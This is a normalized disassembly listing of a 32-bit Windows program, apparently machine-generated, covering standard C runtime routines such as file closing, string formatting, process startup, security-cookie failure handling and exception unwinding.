cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40233b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_404f0c
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_404ce3
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_404562
mov [ esi + 0x4 ] eax
sub_4023c2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_4020da
pop ecx
sub_4023f2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4023e2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_402713
pop ecx
sub_402413
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_4021a8
push esi
mov edi eax
call sub_405bc8
push esi
call sub_404051
push eax
call sub_405b04
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_4020da
and [ esi + 0x1c ] 0x0
pop ecx
sub_402480
push 0xc
push r--data
call sub_402ff0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax 0xffffffff
jmp r-xdata
push esi
call sub_402ef3
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_402413
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4024ec
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_403035
retn
mov eax [ ebp - 0x1c ]
sub_4024f4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_402dd3
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_405780
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4053a0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_402dd3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_402d81
mov eax esi
jmp r-xdata
sub_402569
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40267d
add esp 0x14
pop ebp
retn
sub_402587
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_402a93
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_402a93
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_40267d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax 0xffffffff
pop ebp
retn
call sub_402dd3
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_402d81
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_405d10
call sub_402587
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_402dd3
mov [ eax ] 0x22
sub_402729
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_406981
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_402713
pop ecx
sub_40276d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_402114
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_403858
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_4069b3
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_406b12
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_4068c4
push sub_409634
mov [ rw-data ] esi
call sub_406afb
pop ecx
sub_402816
push 0x58
push r--data
call sub_402ff0
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_403332
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_405055
test eax eax
jne r-xdata
push 0x1c
call sub_4027ed
xor ecx ecx
cmp [ eax + __coff_header ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_407364
mov [ ebp - 0x4 ] esi
call sub_40711f
test eax eax
jns r-xdata
push 0x10
call sub_4027ed
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_407088
mov [ rw-data ] eax
call sub_406fcd
test eax eax
jns r-xdata
push 0x1b
call sub_40361d
call sub_406d57
test eax eax
jns r-xdata
push 0x8
call sub_40361d
push 0x1
call sub_4033fc
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_40361d
call sub_406cf8
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_40361d
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_4035ff
jmp r-xdata
push eax
call sub_4035d3
push ecx
push eax
push esi
push __dos_header
call sub_401990
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_403035
retn
sub_40298d
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40744b
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40744b
pop ecx
sub_402a93
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_404051
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_402dd3
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_402dd3
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_402e1c
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_403f7d
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_40760b
pop ecx
test eax eax
jne r-xdata
call sub_402e1c
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_403f7d
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_4075c2
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_4074d8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_402c06
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_405780
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_40744b
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4020cb
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_40744b
pop ecx
sub_402d2f
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_402c06
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_402d54
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402d2f
int3
pop ebp
jmp eax
sub_402d91
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_402df9
mov edi edi
push ebp
mov ebp esp
push esi
call sub_402de6
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_402d91
pop ecx
mov esi eax
call sub_402dd3
mov [ eax ] esi
pop esi
pop ebp
retn
sub_402e22
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_405274
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_405274
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_402ef3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_4042ca
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_402f34
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_4042ca
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_402f66
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_4041f1
pop ecx
pop ebp
retn
sub_402fa2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_4041f1
pop ecx
pop ebp
retn
sub_402ff0
push sub_403050
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_403050
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4020cb
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4020cb
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40331b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_4032d2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4020cb
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4020cb
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_403302
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40331b
mov eax [ ebp + 0xc ]
push rw-data
call sub_4079e0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4020cb
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_4032e9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4020cb
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_4031e0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_403270
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_407bb5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_407bd4
jmp r-xdata
sub_403270
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4020cb
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_4031e0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4032d2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_403302
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_403350
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_4033a5
mov edi edi
push esi
call sub_404d5c
mov esi eax
push esi
call sub_403849
push esi
call sub_402bf7
push esi
call sub_404330
push esi
call sub_407e26
push esi
call sub_407c21
push esi
call sub_407c10
add esp 0x18
pop esi
retn
sub_4033d8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_4033fc
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_407661
push r--data
push r--data
call sub_4033d8
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_4079e0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_40738a
call sub_406afb
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_4079e0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_403493
push 0x20
push r--data
call sub_402ff0
push 0x8
call sub_4042ca
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4035be
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_403035
retn
mov [ rw-data ] 0x1
push 0x8
call sub_4041f1
pop ecx
push [ ebp + 0x8 ]
call sub_40337b
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_404d5c
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_404d5c
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_40363b
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_403661
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40363b
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4020cb
leave
retn
push 0x3
call sub_408161
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
